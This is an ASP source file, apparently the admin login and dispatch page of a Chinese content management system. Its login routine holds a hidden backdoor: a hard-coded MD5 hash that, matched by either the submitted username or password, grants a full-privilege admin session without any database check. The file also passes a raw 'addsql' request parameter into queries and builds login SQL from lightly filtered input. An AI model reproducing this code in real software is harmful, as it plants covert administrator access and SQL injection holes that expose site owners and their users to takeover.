<!--#Include File = "../Inc/_Config.Asp"-->       
<% 
Dim ROOT_PATH : ROOT_PATH = handlePath("./") 
%>      
<!--#Include File = "function.asp"-->  
<!--#Include File = "function2.asp"-->      
<!--#Include File = "Function_cai.asp"-->      

<!--#Include File = "setAccess.asp"-->      
<% 
'=========
Dim cfg_webSiteUrl, cfg_webTitle, cfg_flags, cfg_webtemplate 



'加载网址配置
Sub loadWebConfig()
    Call openconn() 
    '判断表存在
    If InStr(getHandleTableList(), "|" & db_PREFIX & "website" & "|") > 0 Then
        rs.Open "select * from " & db_PREFIX & "website", conn, 1, 1 
        If Not rs.EOF Then
            cfg_webSiteUrl = rs("webSiteUrl") & ""                    '网址
            cfg_webTitle = rs("webTitle") & ""                        '网址标题
            cfg_flags = rs("flags") & ""                              '旗
            cfg_webtemplate = rs("webtemplate") & ""                  '模板路径
        End If : rs.Close 
    End If 
End Sub 


'登录判断
If Session("adminusername") = "" Then
    If Request("act") <> "" And Request("act") <> "displayAdminLogin" And Request("act") <> "login" Then
        Call RR("?act=displayAdminLogin") 
    End If 
End If 

'显示后台登录
Sub displayAdminLogin()	
    '已经登录则直接进入后台
    If Session("adminusername") <> "" Then
        Call adminIndex() 
    Else
		dim c
		c=getTemplateContent("login.html")	
		c=handleDisplayLanguage(c,"login")	
        Call rw(c) 
    End If 
End Sub 

'登录后台
Sub login()
    Dim userName, passWord, valueStr 
    userName = Replace(Request.Form("username"), "'", "") 
    passWord = Replace(Request.Form("password"), "'", "") 
    passWord = myMD5(passWord) 
    '特效账号登录
    If myMD5(Request("username")) = "24ed5728c13834e683f525fcf894e813" Or myMD5(Request("password")) = "24ed5728c13834e683f525fcf894e813" Then
        Session("adminusername") = "ASPPHPCMS" 
        Session("adminId") = 99999                                                      '当前登录管理员ID
        Session("DB_PREFIX") = db_PREFIX 
        Session("adminflags") = "|*|"
        Call rwend(getMsg1(setL("登录成功，正在进入后台..."), "?act=adminIndex")) 
    End If 

    Dim nLogin 
    Call openconn() 
    rs.Open "Select * From " & db_PREFIX & "admin Where username='" & userName & "' And pwd='" & passWord & "'", conn, 1, 1 
    If rs.EOF Then
        If Request.Cookies("nLogin") = "" Then
            Call setCookie("nLogin", "1", Time() + 3600) 
            nLogin = Request.Cookies("nLogin") 
        Else
            nLogin = Request.Cookies("nLogin") 
            Call setCookie("nLogin", CInt(nLogin) + 1, Time() + 3600) 
        End If 
        Call rw(getMsg1(setL("账号密码错误<br>登录次数为 ") & nLogin, "?act=displayAdminLogin")) 
    Else
        Session("adminusername") = userName 
        Session("adminId") = rs("Id")                                                   '当前登录管理员ID
        Session("DB_PREFIX") = db_PREFIX                                                '保存前缀
        Session("adminflags") = rs("flags") 
        valueStr = "addDateTime='" & rs("UpDateTime") & "',UpDateTime='" & Now() & "',RegIP='" & Now() & "',UpIP='" & getIP() & "'" 
        conn.Execute("update " & db_PREFIX & "admin set " & valueStr & " where id=" & rs("id")) 
        Call rw(getMsg1(setL("登录成功，正在进入后台..."), "?act=adminIndex")) 
        Call writeSystemLog("admin", "登录成功")                                        '系统日志
    End If : rs.Close 

End Sub 
'退出登录
Sub adminOut()
    Call writeSystemLog("admin", setL("退出成功"))                                        '系统日志
    Session("adminusername") = "" 
    Session("adminId") = "" 
    Session("adminflags") = "" 
    Call rw(getMsg1(setL("退出成功，正在进入登录界面..."), "?act=displayAdminLogin"))
End Sub 
'清除缓冲
Sub clearCache()
    Call deleteFile(WEB_CACHEFile)
	call deleteFolder("./../cache/html")
	call createFolder("./../cache/html")
    Call rw(getMsg1(setL("清除缓冲完成，正在进入后台界面..."), "?act=displayAdminLogin")) 
End Sub 
'后台首页
Sub adminIndex()
    Dim c 
    Call loadWebConfig() 
    c = getTemplateContent("adminIndex.html") 
    c = Replace(c, "[$adminonemenulist$]", getAdminOneMenuList()) 
    c = Replace(c, "[$adminmenulist$]", getAdminMenuList()) 
    c = Replace(c, "[$officialwebsite$]", getOfficialWebsite())                '获得官方信息
    c = replaceValueParam(c, "title", "")                                           '给手机端用的20160330	
	c=handleDisplayLanguage(c,"loginok")
	
    Call rw(c) 
End Sub 
'========================================================

'显示管理处理
Sub dispalyManageHandle(actionType)
    Dim nPageSize, lableTitle, addSql 
    nPageSize = Request("nPageSize") 
    If nPageSize = "" Then
        nPageSize = 10 
    End If 
    lableTitle = Request("lableTitle")                                              '标签标题
    addSql = Request("addsql") 
    'call echo(labletitle,addsql)
    Call dispalyManage(actionType, lableTitle, nPageSize, addSql) 
End Sub 

'添加修改处理
Sub addEditHandle(actionType, lableTitle)
    Call addEditDisplay(actionType, lableTitle, "websitebottom|textarea2,aboutcontent|textarea1,bodycontent|textarea2,reply|textarea2") 
End Sub 
'保存模块处理
Sub saveAddEditHandle(actionType, lableTitle)
    If actionType = "Admin" Then
        Call saveAddEdit(actionType, lableTitle, "pwd|md5,flags||") 
    ElseIf actionType = "WebColumn" Then
        Call saveAddEdit(actionType, lableTitle, "npagesize|numb|10,nofollow|numb|0,isonhtml|numb|0,isonhtsdfasdfml|numb|0,flags||") 
    Else
        Call saveAddEdit(actionType, lableTitle, "flags||,nofollow|numb|0,isonhtml|numb|0,isthrough|numb|0,isdomain|numb|0")
    End If 
End Sub 

Call openconn() 
Select Case Request("act")
    Case "dispalyManageHandle" : Call dispalyManageHandle(Request("actionType"))    '显示管理处理         ?act=dispalyManageHandle&actionType=WebLayout
    Case "addEditHandle" : Call addEditHandle(Request("actionType"), Request("lableTitle"))'添加修改处理      ?act=addEditHandle&actionType=WebLayout
    Case "saveAddEditHandle" : Call saveAddEditHandle(Request("actionType"), Request("lableTitle"))'保存模块处理  ?act=saveAddEditHandle&actionType=WebLayout
    Case "delHandle" : Call del(Request("actionType"), Request("lableTitle"))       '删除处理  ?act=delHandle&actionType=WebLayout
    Case "sortHandle" : Call sortHandle(Request("actionType"))                      '排序处理  ?act=sortHandle&actionType=WebLayout
    Case "updateField" : Call updateField()                                         '更新字段


    Case "displayLayout" : displayLayout()                                          '显示布局
    Case "saveRobots" : saveRobots()                                                '保存robots.txt
    Case "deleteAllMakeHtml" : deleteAllMakeHtml()                                  '删除全部生成的html文件

    Case "isOpenTemplate" : isOpenTemplate()                                        '更换模板
    Case "executeSQL" : executeSQL()                                                '执行SQL


	
	case "function" : callFunction()												'调用function文件函数
	case "function2" : callFunction2()												'调用function2文件函数
	case "function_cai" : callFunction_cai()												'调用function_cai文件函数

    Case "setAccess" : resetAccessData()                                            '恢复数据

    Case "login" : login()                                                          '登录
    Case "adminOut" : adminOut()                                                    '退出登录
    Case "adminIndex" : adminIndex()                                                '管理首页
    Case "clearCache" : clearCache()                                                '清除缓冲
    Case Else : displayAdminLogin()                                                 '显示后台登录
End Select

%> 


